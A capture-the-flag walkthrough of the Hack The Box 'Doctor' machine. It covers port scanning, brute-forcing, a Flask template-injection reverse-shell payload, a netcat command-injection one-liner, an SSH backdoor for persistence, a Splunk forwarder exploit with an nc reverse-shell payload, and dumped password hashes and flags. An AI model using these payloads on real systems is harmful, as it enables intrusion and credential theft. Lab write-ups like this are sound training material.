# Doctor

1. `nmap -T4 -Pn -sC 10.10.10.209`.

    ```
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 09:27 EST
    Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 2.45% done; ETC: 09:29 (0:01:20 remaining)
    Nmap scan report for 10.10.10.209
    Host is up (0.032s latency).
    Not shown: 997 filtered ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    | ssh-hostkey: 
    |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
    |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
    |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
    80/tcp   open  http
    |_http-title: Doctor
    8089/tcp open  unknown
    | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
    | Not valid before: 2020-09-06T15:57:27
    |_Not valid after:  2023-09-06T15:57:27

    Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
    ```

2. `https://10.10.10.209:8089` has http login functionality for the `/services` and `/servicesNS` endpoints.
3. I initially thought the website on port 80 was just a standard template but there is the text `Send us a message at info@doctors.htb`. Add `10.10.10.209    doctors.htb` to `/etc/hosts` to get a "Doctor Secure Messaging" page with a login.
4. Directory bruteforcing: `gobuster dir -u http://10.10.10.209 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` and `gobuster dir -u https://10.10.10.209:8089 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --insecuressl`. The secure website produces the following:

    ```
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            https://10.10.10.209:8089
    [+] Threads:        100
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/12/02 09:33:15 Starting gobuster
    ===============================================================
    /services (Status: 401)
    /v2 (Status: 200)
    /v1 (Status: 200)
    /v3 (Status: 200)
    /v4 (Status: 200)
    /v5 (Status: 200)
    /v6 (Status: 200)
    /v7 (Status: 200)
    /v8 (Status: 200)
    /v10 (Status: 200)
    /v11 (Status: 200)
    /v15 (Status: 200)
    /v0 (Status: 200)
    /v01 (Status: 200)
    /v52 (Status: 200)
    /v001 (Status: 200)
    /v23 (Status: 200)
    /v9 (Status: 200)
    /v14 (Status: 200)
    /v20 (Status: 200)
    /v05 (Status: 200)
    /v13 (Status: 200)
    /v12 (Status: 200)
    /v92 (Status: 200)
    /v003 (Status: 200)
    /v209 (Status: 200)
    ===============================================================
    2020/12/02 09:34:19 Finished
    ===============================================================
    ```

5. Searching online finds the following:

    * [Abusing Splunk Forwarders For Shells and Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
    * [cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

    But I need the admin username and password to use them. `admin` is the username according to the first link.

6. Try brute-forcing Splunk login: `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8089 -f 10.10.10.209 http-get /services`. Unsuccessful.

7. On the "Doctor Secure Messaging" page try directory brute-forcing: `gobuster dir -u http://doctors.htb -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`.

    ```
    [+] Url:            http://doctors.htb
    [+] Threads:        100
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/12/02 10:07:32 Starting gobuster
    ===============================================================
    /account (Status: 302)
    /logout (Status: 302)
    /archive (Status: 200)
    /login (Status: 200)
    /register (Status: 200)
    /home (Status: 302)
    /reset_password (Status: 200)
    ===============================================================
    2020/12/02 10:12:18 Finished
    ===============================================================
    ```

8. Try creating an account on "Doctor Secure Messaging" and find comment `<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->`.

9. I tested various approaches with the message posting functionality including [Server Side Template Injection (SSTI) with Flask](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection) since Wappalyzer informed me the web framework was Flask. I then decided to check `/archive` after creating a post. Creating a post with a title and content of `{{7*'7'}}` produces `7777777`, which shows this page is vulnerable to SSTI.

10. Post the following in the title and content using the "New Message" function then visit `/archive` to get a reverse shell:

    ```
    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.131\",3254));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    ```

    The above was obtained from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset) and changed to call `/bin/bash` instead of `/bin/cat` to print a flag.

    The `/archive` page is vulnerable as explained [on this page](https://blog.nvisium.com/p263). `/archive` routing code:

    `cat /home/web/blog/flaskblog/main/routes.py`:

    ```python
    from flask import render_template, render_template_string, request, Blueprint
    from flask_login import current_user, login_required
    from flaskblog.models import Post

    main = Blueprint('main', __name__)


    @main.route("/")
    @main.route("/home")
    @login_required
    def home():
            page = request.args.get('page', 1, type=int)
            posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
            return render_template('home.html', posts=posts, author=current_user)


    @main.route("/archive")
    def feed():
            posts = Post.query.order_by(Post.date_posted.asc())
            tpl = '''
            <?xml version="1.0" encoding="UTF-8" ?>
            <rss version="2.0">
            <channel>
            <title>Archive</title>
            '''
            for post in posts:
                    if post.author==current_user:
                            tpl += "<item><title>"+post.title+"</title></item>\n"
                            tpl += '''
                            </channel>
                            '''
            return render_template_string(tpl)
    ```

    Also, shell injection works without the archive page: `<img src=http://10.10.14.131/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.131'$IFS'4444')/>`.

11. Linpeas (`./linpeas.sh -a 2>&1 | tee linpeas_report.txt`) finds backup file `/var/log/apache2/backup` with has this line in it: `/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"`. You can open [linpeas_report_web.txt](./linpeas_report_web.txt) with `less -R linpeas_report_web.txt`

12. Linpeas users:

    ```
    [+] Users with console
    root:x:0:0:root:/root:/bin/bash
    shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
    splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
    web:x:1001:1001:,,,:/home/web:/bin/bash
    ```

    Trying `Guitar123` as the password for `shuan` works: `su shaun`.

13. Run `run persist.authorized_key user=shaun backdoor_key=/home/kali/Downloads/key` in local `pwntools` shell for persistance.

14. `cat /home/shaun/user.txt`: `da773977d514b6d63e3233dbb30961fd`.

15. Run `./linpeas.sh -a 2>&1 | tee linpeas_report.txt` and `download linepeas_report.txt`. You can open [linpeas_report_shaun.txt](./linpeas_report_shaun.txt) with `less -R linpeas_report_shaun.txt`.

16. Find `1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S` in `/opt/clean/site.db` so the "Doctor Secure Messaging" credentials are `admin@doctor.htb:$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S`

17. This is a bcrypt hash as shown by `/home/web/blog/flaskblog/users/routes.py`. Crack it (`$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S`) with `hashcat -m 3200 -a 0 -o cracked hash /usr/share/wordlists/rockyou.txt`. Cracking didn't work.

18. `cat /home/web/blog.sh` contains `SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py`

19. CUPS running at `127.0.0.1:631`

20. Try splunk login `shaun:Guitar123` at `https://10.10.10.209:8089/services/` which works. Time to test the exploit I found earlier ([cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)).

21. `git clone https://github.com/cnotin/SplunkWhisperer2` then `pwncat 0.0.0.0:4632` then run the exploit: `python3 PySplunkWhisperer2_remote.py --username shaun --password Guitar123 --lhost 10.10.14.131 --lport 46321 --host 10.10.10.209 --payload 'nc.traditional -e /bin/sh 10.10.14.131 4632'`.

22. Need to use `nc.traditional` or `nc [ServerAddress] [ServerPort] 0<f | /bin/sh -i 2>&1 | tee f` because  according to [‘Neutered’ Netcat? No prob!](https://medium.com/@dharma.unik/neutered-netcat-no-prob-1ac188449d1). This is because netcat on Mac and OpenBSD netcat on Ubuntu have the `-e` switch disabled.

23. `cat /root/root.txt`: `006957ab28b0297079fdd8558031768e`

24. Root `/etc/shadow`:

    ```
    root:$6$384TbSO3bB1PWLT1$U8U.j.zBLXobhorPDxOMRZh4eE86lcn7C0dvqRvfJ9qDzreti8HDvXwFZccDat9/HJRNwu04ErVxo3mUwVbs5.:18512:0:99999:7:::
    ```
